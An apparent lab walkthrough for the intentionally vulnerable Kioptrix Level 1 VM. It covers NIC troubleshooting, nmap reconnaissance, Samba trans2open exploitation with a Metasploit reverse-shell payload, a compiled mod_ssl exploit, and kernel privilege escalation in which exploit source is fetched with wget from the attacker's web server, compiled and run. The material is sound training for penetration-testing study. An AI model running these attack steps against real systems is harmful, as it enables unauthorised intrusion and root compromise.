# Kioptrix Level 1 Exploitation Guide

> [!note] Login and password for this VM is: Login: john Password: TwoCows2

> [!info] About this box Kioptrix Level 1 is an old (2004 era) Linux box built around Red Hat/RHEL style services. It runs badly outdated versions of Samba and Apache with OpenSSL, both of which have well known public exploits. This makes it a solid first target for learning the full attack chain: recon, service enumeration, exploit selection, gaining a shell, and privilege escalation.

> [!tip] How to read this guide Every code block below is labeled either ATTACKER (Kali) or VICTIM (Kioptrix) so you always know which machine's terminal a command belongs in.

## Stage 0: Fixing Network / NIC Detection Issues

Before you can even reach this box, you need working networking on both the Kioptrix VM and Kali. This box is old enough that it can trip up on modern VirtualBox defaults, so this stage documents the actual problem and fix.

**The symptom:**

Booting Kioptrix and running `/sbin/ifconfig -a` showed an `eth0` interface with no IP address, and it did not even show as `UP`. Pinging anything failed with "Network is unreachable." Trying different VirtualBox network modes (NAT, NAT Network, Host-only) made no difference, since the network mode was not actually the problem.

**The real cause:**

VirtualBox's default virtual NIC for Adapter 1 was set to "Intel PRO/1000 MT Desktop." Kioptrix's kernel is from around 2004 and does not have a driver for that virtual NIC chipset, so the interface never got detected at the hardware level at all, regardless of what network mode it was attached to.

**The fix:**

1. Shut down the Kioptrix VM completely (not saved state).
    
2. In VirtualBox, open Settings for the Kioptrix VM, go to Network, select Adapter 1, and click Advanced.
    
3. Change Adapter Type from "Intel PRO/1000 MT Desktop" to "PCnet-FAST III." This is an older, simpler NIC that ancient Linux kernels like this one almost always have a built in driver for.
    
4. Set Attached to as "NAT Network" (create one first via File then Tools then Network Manager if you have not already), so Kioptrix and Kali can reach each other while Kioptrix also gets an address automatically.
    
5. Boot the VM. The kernel boot log should now show something like:
    
    **VICTIM (Kioptrix, boot log)**
    
    ```
    pcnet32_probe_pci: found device
    eth0: PCnet/FAST III 79C973 ... assigned IRQ 9
    ```
    
6. Log in as john and check the interface, using the full path since `/sbin` is often not in a normal user's PATH:
    
    **VICTIM (Kioptrix)**
    
    ```bash
    /sbin/ifconfig -a
    ```
    
    If eth0 now shows an `inet addr` (something like `10.0.2.3`), it picked up a DHCP lease automatically at boot and no manual configuration is needed. If it still fail to show ip address then use:
    ```bash
    dmesg | tail -50
    ```
    after than again check if there is an ip address or not, it worked for me.
    
7. On the Kali side, make sure Kali's VM also has an adapter attached to the same NAT Network, then confirm and test connectivity:
    
    **ATTACKER (Kali)**
    
    ```bash
    ip a
    ping 10.0.2.3
    ```
    

> [!tip] Lesson learned If a VM's network interface will not show up or get an address no matter what network mode you try, suspect the virtual NIC hardware type before suspecting the network mode. This especially applies to very old guest OSes, where the kernel simply may not ship a driver for whatever the hypervisor defaults to.

## Stage 1: Reconnaissance

Start by finding the machine on your network and confirming it is alive.

**ATTACKER (Kali)**

```bash
netdiscover
# or
nmap -sn 10.0.2.0/24
```

Once you have the IP, run a full port and service scan.

**ATTACKER (Kali)**

```bash
nmap -sV -sC -p- -A -oN allports.txt 10.0.2.3
```

You should see something roughly like this in the results:

- Port 22 SSH
- Port 80 HTTP (Apache, with mod_ssl)
- Port 111 RPC
- Port 139/445 Samba
- Port 443 HTTPS

The two interesting ones here are Samba and the Apache/mod_ssl combo, since both have known vulnerabilities for the versions this box runs.

## Stage 2: Service Enumeration

Before jumping to an exploit, confirm the exact versions so you pick the right one.

**ATTACKER (Kali)**

```bash
nmap -sV -p 139,445 10.0.2.3
```

Check the Samba version reported. Older Kioptrix builds run Samba 2.2.x, which is vulnerable to a well documented buffer overflow known as trans2open.

For the web server, check what SSL/module version Apache is reporting:

**ATTACKER (Kali)**

```bash
curl -v https://10.0.2.3/ -k
```

Or use openssl directly to see the handshake details:

**ATTACKER (Kali)**

```bash
openssl s_client -connect 10.0.2.3:443
```

Old mod_ssl builds paired with vulnerable OpenSSL versions on this box are exploitable through a known buffer overflow, sometimes referred to by the nickname OpenFuck in older writeups.

## Stage 3: Exploitation Paths

There are two classic routes into this box. You only need one to succeed, but it is worth understanding both since you will see similar patterns on other old boxes.

### Route A: Samba trans2open

All of the following run on your Kali machine, since Metasploit is your attack tool here, not something you run on the victim.

1. Search Metasploit for the matching module:
    
    **ATTACKER (Kali)**
    
    ```
    msfconsole
    search trans2open
    use exploit/linux/samba/trans2open
    ```
    
2. Set the required options:
    
    **ATTACKER (Kali)**
    
    ```
    set RHOSTS 192.168.1.X
    set PAYLOAD linux/x86/shell_reverse_tcp
    set LHOST <your Kali IP>
    run
    ```
    
3. If it lands correctly you should get a raw shell back on your listener. From this point on, that shell is a VICTIM terminal, since you are now executing commands on Kioptrix itself, just through a channel opened from Kali.
    

### Route B: Apache mod_ssl / OpenSSL buffer overflow

This one is older and trickier since Metasploit does not always have a clean module for every version pairing. Many people compile a standalone C exploit for this instead.

1. Confirm the exact Apache and OpenSSL version pairing from your enumeration step.
    
2. Search for a public exploit matching that pairing (search terms like "Apache mod_ssl buffer overflow" plus the version numbers).
    
3. Compile it locally on Kali, then run it against the target:
    
    **ATTACKER (Kali)**
    
    ```bash
    gcc -o sslexploit sslexploit.c -lcrypto
    ./sslexploit 192.168.1.X
    ```
    
4. Run it against the target with the correct offset number for the target OS build (these old exploits usually require you to pick an offset that matches the target's distro/version). This step is still run from Kali, it is Kali reaching out and attacking the victim over the network, not something typed on Kioptrix.
    

> [!warning] Getting the offset wrong This exploit is finicky. If it does not work on the first offset, try the next one in the list the exploit provides. This is normal and expected for this box, not a sign something else is broken.

## Stage 4: Post Exploitation

Once you land a shell, it is likely a low privilege one (running as the web server or Samba service user, not root). Everything in this stage runs inside that shell, meaning it is now a VICTIM terminal even though you are typing it from your Kali window.

**VICTIM (Kioptrix, inside your shell)**

```bash
whoami
id
uname -a
cat /etc/passwd
```

You may also be able to log in directly using the credentials noted at the top of this file (john / TwoCows2), which is useful for confirming access or continuing enumeration from a stable shell if your exploit shell is unstable. That login itself happens from Kali, for example:

**ATTACKER (Kali)**

```bash
ssh john@192.168.1.X
```

but once you are logged in, everything you type after that is again VICTIM side.

## Stage 5: Privilege Escalation

Kioptrix Level 1 is vulnerable to a well known local kernel exploit for this era of Linux, often referred to as the ptrace/kmod exploit or similar naming depending on the writeup you find. The general approach:

1. Check the kernel version:
    
    **VICTIM (Kioptrix)**
    
    ```bash
    uname -r
    ```
    
2. Search for a matching local privilege escalation exploit for that exact kernel version. This search itself happens on your Kali machine or your browser, not on the victim.
    
3. Host the exploit source on Kali so the victim can pull it over:
    
    **ATTACKER (Kali)**
    
    ```bash
    python3 -m http.server 8000
    ```
    
4. Pull it down and compile and run it directly on the victim:
    
    **VICTIM (Kioptrix)**
    
    ```bash
    wget http://<your Kali IP>:8000/exploit.c
    gcc -o exploit exploit.c
    ./exploit
    ```
    
5. Confirm root:
    
    **VICTIM (Kioptrix)**
    
    ```bash
    id
    ```

## Notes and Lessons

- This box is a good example of why version enumeration matters so much. Everything downstream depends on getting the exact Samba and Apache/OpenSSL versions right.
- Old exploits like these often need to be compiled locally rather than run straight out of a downloaded binary. Get comfortable reading exploit source code before running it, even in a lab.
- If Metasploit does not have a clean module for something, that is normal for boxes this old. Manual compiling is a core skill, not a fallback.
- A simple way to keep the two terminals straight while you work: keep two separate terminal windows open side by side, label one Kali and one Kioptrix, and never let commands from one drift into the other.
- Network/NIC issues are common with boxes this old. If an interface will not appear no matter the network mode, check the virtual NIC hardware type first (see Stage 0).
